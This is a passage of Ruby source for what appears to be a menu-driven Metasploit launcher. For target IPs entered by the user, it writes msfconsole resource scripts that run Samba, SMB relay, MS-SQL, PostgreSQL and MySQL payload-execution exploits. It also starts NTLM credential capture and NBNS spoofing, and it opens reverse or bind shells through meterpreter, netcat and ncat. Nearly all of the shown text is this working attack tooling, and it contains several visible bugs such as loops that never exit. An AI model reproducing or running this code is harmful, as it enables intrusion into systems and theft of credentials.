                                    f.puts "set ExitOnSession false"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    smb_version="xterm -title 'MSF Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '7'
                                    puts "Exploit Samba trans2open Overflow (*nix) Vulnerability"
                                    while(true)
                                            puts "Select target: "
                                            puts "1) *BSD x86"
                                            puts "2) Linux x86"
                                            puts "3) Mac OS X PPC"
                                            puts "4) Solaris SPARC"
                                            answer=gets.chomp
                                            puts
                                            case answer
                                                    when '1'
                                                            sploit='exploit/freebsd/samba/trans2open'
                                                    when '2'
                                                            sploit='exploit/linux/samba/trans2open'
                                                    when '3'
                                                            sploit='exploit/osx/samba/trans2open'
                                                    when '4'
                                                            sploit='exploit/solaris/samba/trans2open'
                                            end
                                    end
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching Exploit for Samba trans2open Overflow against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use #{sploit}"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    f.puts "set ExitOnSession false"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    smb_version="xterm -title 'MSF Listener #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '8'
                                    puts "Exploit Samba 'username map script' Command Execution (3.0.20 through 3.0.25rc3)"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    payloadz=[ '1' => 'cmd/unix/bind_netcat', '2' => 'cmd/unix/bind_netcat_gaping', '3' => 'cmd/unix/bind_perl', '4' => 'cmd/unix/bind_ruby', '5' => 'cmd/unix/reverse', '6' => 'cmd/unix/reverse_netcat', '7' => 'cmd/unix/reverse_netcat_gaping', '8' => 'cmd/unix/reverse_perl', '9' => 'cmd/unix/reverse_python', '10' => 'cmd/unix/reverse_ruby' ]
                                    while(true)
                                            puts "Select Payload to use: "
                                            payloadz.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}" }
                                            sizer=payloadz.size
                                            answer=gets.chomp
                                            puts
                                            if answer.to_i == 0 or answer.to_i > sizer.to_i
                                                    puts
                                                    puts "Please Enter a Valid Option!"
                                                    puts
                                            else
                                                    payload = payloadz[answer]
                                                    break
                                            end
                                    end
     
     
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching Exploit for Samba 'username map script' Command Execution Vulnerability against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/multi/samba/usermap_script"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    f.puts "set ExitOnSession false"
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    samba_sploit="xterm -title 'MSF Samba 'username map script' Command Execution Exploit #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_version)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '9'
                                    puts "Microsoft Windows SMB Relay Code Execution Exploit"
                                    puts "Select Targeting Method: "
                                    puts "1) Single Target IP"
                                    puts "2) Anyone who knocks on our door"
                                    answer=gets.chomp
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use exploit/windows/smb/smb_relay'
                                    if answer == '1'
                                            puts "Provide Target IP: "
                                            zIP=gets.chomp
                                            puts
                                            f.puts 'set SMBHOST #{zIP}'
                                    end
                                    while(true)
                                            puts "Select Share Name to Connect to: "
                                            puts "1) ADMIN$ (Remote Admin Disk => Default)"
                                            puts "2) C$ (Default Winblows Share)"
                                            puts "3) IPC$ (Winblows Remote IPC)"
                                            puts "4) Custom User Provided Share (z$, plus$, forums$)"
                                            answer=gets.chomp
                                            puts
                                            case answer
                                                    when '1'
                                                            break
                                                    when '2'
                                                            f.puts 'set SHARE C$'
                                                            break
                                                    when '3'
                                                            f.puts 'set SHARE IPC$'
                                                            break
                                                    when '4'
                                                            puts "Provide Custom Share Name: "
                                                            custom_share=gets.chomp
                                                            f.puts "set SHARE #{custom_share}"
                                                            break
                                            end
                                    end
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching Exploit SMB Relay Server in a new x-window....."
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    f.puts "set ExitOnSession false"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    smb_relay="xterm -title 'MSF SMB Relay Exploit #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_relay)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '10'
                                    puts "NetBIOS Name Service Spoofer"
                                    puts "Select the Interface to use for listening: "
                                    count=1
                                    while(true)
                                            face = commandz('ifconfig | cut -d\' \' -f1 | sed \'/^$/d\'').each do |x|
                                                    if count.to_i < 10
                                                            puts "#{count})  #{x.chomp}"
                                                    else
                                                            puts "#{count}) #{x.chomp}"
                                                    end
                                                    count = count.to_i + 1
                                            end
                                            answer=gets.chomp
                                            puts
                                            if answer > 0 and answer <= bar.size
                                                    interface=face[answer.to_i-1] #have to account for a zero index ;)
                                                    break
                                            end
                                    end
                                    puts "IP address to poison in responses: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Launching NetBIOS Name Service Spoofer Server in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use use auxiliary/spoof/nbns/nbns_response'
                                    f.puts "set INTERFACE #{interface}"
                                    f.puts "set SPOOFIP #{zIP}"
                                    f.puts 'exploit -j'
                                    f.close
     
                                    nbns="xterm -title 'MSF NetBIOS Name Service Spoofer #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(nbns)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '11'
                                    puts "HTTP Client MS Credential Catcher (http_ntlm)"
                                    puts "Server Port to Use: "
                                    zPORT=gets.chomp
                                    puts
     
                                    puts "URI Path to Use: "
                                    zPATH=gets.chomp
                                    puts
     
                                    puts "Launching HTTP MS NTLM Credential Capture Server in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/server/capture/http_ntlm'
                                    f.puts "set SRVPORT #{zPORT}"
                                    f.puts "set URIPATH #{zPATH}"
                                    f.puts "set CAINPWFILE #{Dir.pwd}/cain_http_ntlm.txt"
                                    f.puts "set JOHNPWFILE #{Dir.pwd}/john_http_ntlm.txt"
                                    f.puts 'exploit -j'
                                    f.close
     
                                    http_ntlm="xterm -title 'MSF HTTP NTLM Capture Server #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(http_ntlm)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '12'
                                    puts "Launching SMB Authentication Capture Server in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/server/capture/smb'
                                    f.puts "set CAINPWFILE #{Dir.pwd}/cain_smb.txt"
                                    f.puts "set JOHNPWFILE #{Dir.pwd}/john_smb.txt"
                                    f.puts 'exploit -j'
                                    f.close
     
                                    smb_auth="xterm -title 'MSF SMB Authentication Capture Server #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(smb_auth)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '13'
                                    puts "Microsoft SQL Server NTLM Stealer"
                                    puts "Provide target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    while(true)
                                            puts "Use default MS-SQL Port of 1433 (Y/N)?"
                                            answer=gets.chomp
                                            puts
                                            if answer.upcase == 'N' or answer.upcase == 'NO'
                                                    puts "Provide Port to use then: "
                                                    zPORT=gets.chomp
                                                    puts
                                                    break
                                            elsif answer.upcase == 'Y' or answer.upcase == 'YES'
                                                    zPORT='1433'
                                                    break
                                            end
                                    end
     
                                    puts "MS-SQL Username (sa): "
                                    zUSER=gets.chomp
                                    puts
     
                                    puts "MS-SQL Password: "
                                    zPASS=gets.chomp
                                    puts
     
                                    while(true)
                                            puts "Is SMB Proxy Server running locally (Y/N)?"
                                            answer=gets.chomp
                                            puts
                                            if answer.upcase == 'N' or answer.upcase == 'NO'
                                                    puts "Provide IP of SMB Proxy Server: "
                                                    smbProxy=gets.chomp
                                                    puts
                                            elsif answer.upcase == 'Y' or answer.upcase == 'YES'
                                                    smbProxy='0.0.0.0'
                                            end
                                    end
     
                                    puts "Launching Microsoft SQL Server NTLM Stealer in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/admin/mssql/mssql_ntlm_stealer'
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
                                    f.puts "set SMBPROXY #{smbProxy}"
                                    f.puts "set USERNAME #{zUSER}"
                                    f.puts "set PASSWORD #{zPASS}"
                                    f.puts 'exploit -j'
                                    f.close
     
                                    ntlm_stealer="xterm -title 'MSF Microsoft SQL Server NTLM Stealer #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(ntlm_stealer)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '14'
                                    puts "Microsoft SQL Server NTLM Stealer via SQLi"
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts 'use auxiliary/admin/mssql/mssql_ntlm_stealer'
     
                                    while(true)
                                            puts "Select Request Type: "
                                            puts "1) GET"
                                            puts "2) POST"
                                            answer=gets.chomp
                                            puts
                                            puts "Provide vuln URI with '[SQLi]' marker in place where needed (can be in DATA section for POST): "
                                            puts "NOTE: include any prefix or siffix required to complete injection!"
                                            puts "\t=> http://example.com/index.asp?vuln=1';[SQLi];-- -&notvuln=form"
                                            vuln_link=URI(URI.encode(gets.chomp))
                                            if answer == '1'
                                                    break
                                            elsif answer == '2'
                                                    puts 'Please provide any POST Data needed for request: '
                                                    zDATA=gets.chomp
                                                    f.puts "set DATA #{zDATA}"
                                                    f.puts 'set METHOD POST'
                                                    break
                                            end
                                    end                    
     
                                    f.puts "set GET_PATH #{vuln_link.request_uri}"
                                    f.puts "set RHOST #{vuln_link.host}"
                                    f.puts "set RPORT #{vuln_link.port}"
                                    f.puts "set VHOST #{vuln_link.host}"
     
                                    while(true)
                                            puts "Is SMB Proxy Server running locally (Y/N)?"
                                            answer=gets.chomp
                                            puts
                                            if answer.upcase == 'N' or answer.upcase == 'NO'
                                                    puts "Provide IP of SMB Proxy Server: "
                                                    smbProxy=gets.chomp
                                                    puts
                                            elsif answer.upcase == 'Y' or answer.upcase == 'YES'
                                                    smbProxy='0.0.0.0'
                                            end
                                    end
     
                                    puts "Launching Microsoft SQL Server NTLM Stealer via SQL Injetion in a new x-window....."
                                    f.puts "set SMBPROXY #{smbProxy}"
                                    f.puts 'exploit -j'
                                    f.close
     
                                    ntlm_stealer="xterm -title 'MSF Microsoft SQL Server NTLM Stealer via SQLi #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(ntlm_stealer)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '15'
                                    puts "Microsoft SQL Server xp_cmdshell Payload Execution"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Please provide MS-SQL Username (sa): "
                                    sqlUser=gets.chomp
                                    puts
     
                                    puts "Please provide MS-SQL User Password: "
                                    sqlPass=gets.chomp
                                    puts
     
                                    puts "Use Standard MS-SQL Port of 1433 (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            puts "Provide MS-SQL Port: "
                                            zPORT=gets.chomp
                                            puts
                                    else
                                            zPORT='1433'
                                    end
     
                                    while(true)
                                            puts "Select Payload Delivery Method: "
                                            puts "1) debug.com Old School Method (x86 Only)"
                                            puts "2) wcsript.exe Command Stager Method"
                                            puts "3) PowerShell Delivery"
                                            answer=gets.chomp
                                            puts
                                            if answer == '1'
                                                    zMETHOD='old'
                                            elsif answer == '2'
                                                    zMETHOD='cmd'
                                            elsif answer == '3'
                                                    zMETHOD='ps'
                                            end
                                    end
     
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
     
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching Microsoft SQL Server xp_cmdshell Payload Execution against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/windows/mssql/mssql_payload"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
                                    f.puts "set USERNAME #{sqlUser}"
                                    f.puts "set PASSWORD #{sqlPass}"
     
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "set ExitOnSession false"
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    sql_sploit="xterm -title 'MSF Microsoft SQL Server xp_cmdshell Payload Execution #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(sql_sploit)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '16'
                                    puts "Microsoft SQL Server xp_cmdshell Payload Execution via SQLi"
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/windows/mssql/mssql_payload_sqli"
                                    while(true)
                                            puts "Select Request Type: "
                                            puts "1) GET"
                                            puts "2) POST"
                                            answer=gets.chomp
                                            puts
                                            puts "Provide vuln URI with '[SQLi]' marker in place where needed (can be in DATA section for POST): "
                                            puts "NOTE: include any prefix or siffix required to complete injection!"
                                            puts "\t=> http://example.com/index.asp?vuln=1';[SQLi];-- -&notvuln=form"
                                            vuln_link=URI(URI.encode(gets.chomp))
                                            if answer == '1'
                                                    break
                                            elsif answer == '2'
                                                    puts 'Please provide any POST Data needed for request: '
                                                    zDATA=gets.chomp
                                                    f.puts "set DATA #{zDATA}"
                                                    f.puts 'set METHOD POST'
                                                    break
                                            end
                                    end
                                    f.puts "set GET_PATH #{vuln_link.request_uri}"
                                    f.puts "set RHOST #{vuln_link.host}"
                                    f.puts "set RPORT #{vuln_link.port}"
                                    f.puts "set VHOST #{vuln_link.host}"
     
                                    while(true)
                                            puts "Select Payload Delivery Method: "
                                            puts "1) debug.com Old School Method (x86 Only)"
                                            puts "2) wcsript.exe Command Stager Method"
                                            puts "3) PowerShell Delivery"
                                            answer=gets.chomp
                                            puts
                                            if answer == '1'
                                                    f.puts "set DELIVERY old"
                                                    break
                                            elsif answer == '2'
                                                    f.puts "set DELIVERY cmd"
                                                    break
                                            elsif answer == '3'
                                                    f.puts "set DELIVERY ps"
                                                    break
                                            end
                                    end
     
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching Microsoft SQL Server xp_cmdshell Payload Execution via SQL Injection against #{zIP} in a new x-window....."
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "set ExitOnSession false"
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    sqli_sploit="xterm -title 'MSF MS-SQL Server xp_cmdshell Payload Execution - SQLi #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(sqli_sploit)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '17'
                                    puts "PostgreSQL for Windows Payload Execution"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Please provide PostgreSQL Username: "
                                    sqlUser=gets.chomp
                                    puts
     
                                    puts "Please provide PostgreSQL User Password: "
                                    sqlPass=gets.chomp
                                    puts
     
                                    puts "Use Standard PostgreSQL Port of 5432 (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            puts "Provide PostgreSQL Port: "
                                            zPORT=gets.chomp
                                            puts
                                    else
                                            zPORT='5432'
                                    end
     
                                    while(true)
                                            puts "Select Target Type: "
                                            puts "1) Windows x86"
                                            puts "2) Windows x86_64"
                                            answer=gets.chomp
                                            puts
                                            if answer == '1'
                                                    zTARGET='0'
                                            elsif answer == '2'
                                                    zTARGET='1'
                                            end
                                    end
     
                                    puts "Please remember to choose a Windows Payload....."
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching PostgreSQL for Windows Payload Execution against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/windows/postgres/postgres_payload"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
                                    f.puts "set USERNAME #{sqlUser}"
                                    f.puts "set PASSWORD #{sqlPass}"
     
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    f.puts "set ExitOnSession false"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    pgsql_sploit="xterm -title 'MSF PostgreSQL for Windows Payload Execution #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(pgsql_sploit)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '18'
                                    puts "PostgreSQL for Linux Payload Execution"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Please provide PostgreSQL Username: "
                                    sqlUser=gets.chomp
                                    puts
     
                                    puts "Please provide PostgreSQL User Password: "
                                    sqlPass=gets.chomp
                                    puts
     
                                    puts "Use Standard PostgreSQL Port of 5432 (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            puts "Provide PostgreSQL Port: "
                                            zPORT=gets.chomp
                                            puts
                                    else
                                            zPORT='5432'
                                    end
     
                                    while(true)
                                            puts "Select Target Type: "
                                            puts "1) Linux x86"
                                            puts "2) Linux x86_64"
                                            answer=gets.chomp
                                            puts
                                            if answer == '1'
                                                    zTARGET='0'
                                            elsif answer == '2'
                                                    zTARGET='1'
                                            end
                                    end
     
                                    puts "Please remember to choose a Linux Payload....."
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching PostgreSQL for Linux Payload Execution against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/linux/postgres/postgres_payload"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
                                    f.puts "set USERNAME #{sqlUser}"
                                    f.puts "set PASSWORD #{sqlPass}"
     
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    f.puts "set ExitOnSession false"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    pgsql_sploit="xterm -title 'MSF PostgreSQL for Linux Payload Execution #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(pgsql_sploit)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '19'
                                    puts "Oracle MySQL for Microsoft Winblows UDF Payload Execution"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Please provide MySQL Username: "
                                    sqlUser=gets.chomp
                                    puts
     
                                    puts "Please provide MySQL User Password: "
                                    sqlPass=gets.chomp
                                    puts
     
                                    puts "Use Standard MySQL Port of 3306 (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            puts "Provide MySQL Port: "
                                            zPORT=gets.chomp
                                            puts
                                    else
                                            zPORT='3306'
                                    end
     
                                    puts "Please remember to choose a Winblows Payload....."
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching MySQL for Winblows UDF Payload Execution against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/windows/mysql/mysql_payload"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
                                    f.puts "set USERNAME #{sqlUser}"
                                    f.puts "set PASSWORD #{sqlPass}"
     
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    f.puts "set ExitOnSession false"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    mysql_sploit="xterm -title 'MSF MySQL for Winblows UDF Payload Execution #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(mysql_sploit)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '20'
                                    puts "Oracle MySQL for Microsoft Winblows MOF Payload Execution"
                                    puts "Provide Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Please provide MySQL Username: "
                                    sqlUser=gets.chomp
                                    puts
     
                                    puts "Please provide MySQL User Password: "
                                    sqlPass=gets.chomp
                                    puts
     
                                    puts "Use Standard MySQL Port of 3306 (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            puts "Provide MySQL Port: "
                                            zPORT=gets.chomp
                                            puts
                                    else
                                            zPORT='3306'
                                    end
     
                                    puts "Please remember to choose a Winblows Payload....."
                                    payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
                                    if payload =~ /bind/
                                            puts "Please provide PORT for Bind Shell: "
                                    else
                                            puts "Please provide PORT to listen on: "
                                    end
                                    zport=gets.chomp
                                    puts
     
                                    puts "Launching MySQL for Winblows MOF Payload Execution against #{zIP} in a new x-window....."
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use exploit/windows/mysql/mysql_mof"
                                    f.puts "set RHOST #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
                                    f.puts "set USERNAME #{sqlUser}"
                                    f.puts "set PASSWORD #{sqlPass}"
     
                                    f.puts "set PAYLOAD #{payload}"
                                    f.puts "set LHOST 0.0.0.0"
                                    f.puts "set LPORT #{zport}"
                                    f.puts "set ExitOnSession false"
                                    if payload =~ /meterpreter/
                                            f.puts "set AutoRunScript migrate -f"
                                    end
                                    f.puts "exploit -j -z"
                                    f.close
     
                                    mofsql_sploit="xterm -title 'MSF MySQL for Winblows MOF Payload Execution #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(mofsql_sploit)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            else
                                    puts
                                    puts "Oops, Didn't quite understand that one!"
                                    puts "Please try again....."
                                    puts
                                    exploit_builder
                            end
            end
    end
     
    #Multi/Handler Setup
    def listener_builder
            cls
            puts
            puts "Welcome to the Listener & Exploit Multi Handler Assistant"
            puts
            payload = payload_selector(1) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
            rcfile="#{Dir.pwd}/msfassist.rc"
            f=File.open(rcfile, 'w')
            if payload =~ /bind/
                    puts "Please provide IP for Bind Shell: "
                    zIP=gets.chomp
                    puts
     
                    puts "Please provide PORT for Bind Shell: "
                    zPORT=gets.chomp
                    puts
                    if not payload == 'generic/bind_shell'
                            puts "Launching MSF Exploit/Multi/Handler Connection for #{payload} Binded to #{zIP} on Port #{zPORT} in a new x-window....."
                            f.puts 'use exploit/multi/handler'
                            f.puts "set PAYLOAD #{payload}"
                            f.puts "set RHOST #{zIP}"
                            f.puts 'set LHOST 0.0.0.0'
                            f.puts "set LPORT #{zPORT}"
                            f.puts 'set ExitOnSession false'
                            if payload =~ /meterpeter/
                                    f.puts 'set AutoRunScript migrate -f'
                            end
                            f.puts 'exploit -j -z'
                            f.close
                            givemeshell="xterm -title 'MSF Connection #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{@rcfile}'\""
                    else
                            puts "Generic Bind Shell Selected!"
                            while(true)
                                    puts "Select how to connect: "
                                    puts "1) Ncat"
                                    puts "2) NetCat"
                                    answer=gets.chomp
                                    if answer.to_i == 1
                                                    givemeshell="xterm -title 'Ncat Connection #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c 'ncat -v #{zIP} #{zPORT}'\""
                                                    puts "Launching Ncat Connection to Binded Shell at #{zIP} on Port #{zPORT} in new x-window......"
                                                    break
                                    elsif answer.to_i == 2
